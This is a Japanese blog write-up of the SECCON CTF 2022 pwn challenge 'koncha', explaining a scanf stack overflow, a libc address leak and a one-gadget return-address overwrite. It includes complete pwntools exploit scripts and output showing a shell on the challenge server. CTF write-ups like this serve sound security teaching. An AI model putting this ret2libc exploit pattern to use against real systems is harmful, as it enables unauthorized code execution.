---
weight: 1
bookFlatSection: true
title: "SECCON CTF 2022 Writeup 'koncha'[pwn]"
---

# SECCON CTF 2022 Writeup 'koncha'[pwn]

2022年11月に開催されたSECCON2022予選に参加しました．
おそらく日本で一番有名かつ大規模なCTF大会ということもあり，非常に面白い問題（そして難しい問題）が多く，
競技時間の24時間は必死に問題に取り組むことができ楽しかったです．

本記事では，競技時間中にFLAGを見つけることができたpwnの問題についてメモを残します．


## 問題
{{< img400x src="seccon2022-koncha.png" alt="koncha" >}}


tar.gzファイルを展開すると，問題のC言語ファイル，バイナリ，libc，ローカル実行環境構築用のDockerfileなどがあります．

## 解法
C言語ファイルの重要な部分を抜き出すと，以下のようになります．

`name`, `country`変数を定義して，1回目のscanfでnameに入力値を格納，printfでnameを出力．
2回目のscanfでcountryに入力値を格納，printfでcountryを出力するという非常にシンプルなプログラムです．
```c
int main() {
  char name[0x30], country[0x20];

  scanf("%[^\n]s", name);
  printf("Nice to meet you, %s!\n", name);
  scanf("%s", country);
  printf("Wow, %s is such a nice country!\n", country);
  return 0;
}
```

また，各種セキュリティ機構は以下のようになっています．64bitでcanaryなし，PIE (Position Independent Executables) ありです．
```bash
$ checksec ./chall
[*] 'chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

このプログラムの脆弱性は，2回行われるscanfに入力文字数の制限がないことです．
これにより，スタックオーバーフローを起こすことができます．

exploitの方針としては，以下のようになります．
1. 1回目のscanfとprintfでlibcアドレスのリークを行う．
2. 2回目のscanfでスタックオーバーフローの脆弱性を用いてmain関数のリターンアドレスを書き換えて，one gadgetに飛ばす．


libcアドレスのリークについては，1回目の入力で何も入力せずにEnterキーを押すと，スタック上に配置されているアドレスらしき文字列が表示されました．
（?Rhの部分がリークしているアドレスです．ASCIIで対応する文字がないので文字化けみたいになってますね）
```bash
./chall
Hello! What is your name?

Nice to meet you, �Rh!
```

表示された文字は，16進数で表現すると`0x7ffff7fab2e8`のようなアドレスになっています．（実行するたびに値は変わります．）
GDBで見てみると，このアドレスはどうやらlibcの`__exit_funcs_lock`という部分を指しているようです．（データ領域かな？）

```bash
gdb-peda$ pdisas 0x00007ffff7fab2e8
   0x00007ffff7fab2e8 <__exit_funcs_lock+0>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2ea <__exit_funcs_lock+2>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2ec:	add    BYTE PTR [rax],al
   0x00007ffff7fab2ee:	add    BYTE PTR [rax],al
   0x00007ffff7fab2f0 <__wctomb_state+0>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2f2 <__wctomb_state+2>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2f4 <__wctomb_state+4>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2f6 <__wctomb_state+6>:	add    BYTE PTR [rax],al
   0x00007ffff7fab2f8:	add    BYTE PTR [rax],al
   0x00007ffff7fab2fa:	add    BYTE PTR [rax],al
   0x00007ffff7fab2fc:	add    BYTE PTR [rax],al
   0x00007ffff7fab2fe:	add    BYTE PTR [rax],al
   0x00007ffff7fab300 <__libc_drand48_data+0>:	add    BYTE PTR [rax],al
   0x00007ffff7fab302 <__libc_drand48_data+2>:	add    BYTE PTR [rax],al
   0x00007ffff7fab304 <__libc_drand48_data+4>:	add    BYTE PTR [rax],al
   0x00007ffff7fab306 <__libc_drand48_data+6>:	add    BYTE PTR [rax],al
```

リークできたアドレスから，libcアドレスのベースを求めて，さらにone gadgetのアドレスも計算しておきます．


ここまでのコードを以下に書きます


```python
from pwn import *  # pwntools

# ↓gdbでexit_functions_lockとlibcのベースアドレスをメモして，オフセットを計算しとく
offset_exit_functions_lock = 0x7ffff7fab2e8 - 0x7ffff7dba000
# ↓one_gadgetコマンドで取得
offset_og = 0xe3b01 


sock = process('./bin/chall')

# exit_functions_lockアドレスをリーク
text = sock.recvline() # b'Hello! What is your name?\n'
sock.sendline(b"")
text = sock.recvuntil("Nice to meet you, ") # Nice to meet you, 

# リークしたアドレスを頑張ってintに変換
low = sock.recv(4)
high = sock.recv(2) + b'\x00\x00'
exit_funcs_lock = unpack(low) + unpack(high) * 0x100000000

libc_base = exit_funcs_lock - offset_exit_functions_lock    # libcベースアドレスの計算
og_addr = libc_base + offset_og                             # one gadgetアドレスの計算

# デバッグのために，リークしたアドレス，計算したアドレスを表示
print("exit_funcs_lock", hex(exit_funcs_lock))
print("libc_base", hex(libc_base))
print("libc_one_gadget", hex(og_addr))
```

one gadgetアドレスがわかったので，後はret2libcするだけです．

2回目のscanfでスタックオーバーフローができるので，main関数のリターンアドレスに，先ほど計算したone gadgetアドレスを入れます．
scanfで入力した文字列の先頭から，main関数のリターンアドレスまでのオフセットは88バイトだったので，88バイト分適当な文字を入れてパディングしています．

最終的なexploitコードは以下のようになります．



```python
from pwn import *

offset_exit_functions_lock = 0x7efec96482e8 - 0x7efec9457000
offset_og = 0xe3b01

sock = remote('koncha.seccon.games', 9001)

text = sock.recvline() # b'Hello! What is your name?\n'
sock.sendline(b"")
text = sock.recvuntil("Nice to meet you, ")
low = sock.recv(4)
high = sock.recv(2) + b'\x00\x00'
exit_funcs_lock = unpack(low) + unpack(high) * 0x100000000
libc_base = exit_funcs_lock - offset_exit_functions_lock
og_addr = libc_base + offset_og
print("exit_funcs_lock", hex(exit_funcs_lock))
print("libc_base", hex(libc_base))
print("libc_one_gadget", hex(og_addr))


# 2回目のscanfでret書き換え
payload = b"A" * 88
payload += p64(og_addr)
sock.sendline(payload)

sock.interactive()
```

exploitコードの接続先をremoteに置き換えて実行すると，問題サーバ側でシェルが起動して対話形式になります．

`ls`コマンドを打つと`flag-50d....txt`が表示されているので，`cat`コマンドでファイルの中身を表示すると，FLAGを見つけることができました．

```bash
$ python3 solve.py
[+] Opening connection to koncha.seccon.games on port 9001: Done
b'Hello! What is your name?\n'
b'Nice to meet you, '
exit_funcs_lock 0x7f58018cf2e8
libc_base 0x7f58016de000
libc_one_gadget 0x7f58017c1b01
[*] Switching to interactive mode
!
Which country do you live in?
Wow, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1b|X\x7f is such a nice country!
Itls
chall
flag-50d05c4f3e767dfc58f5cde347c36370.txt
$
```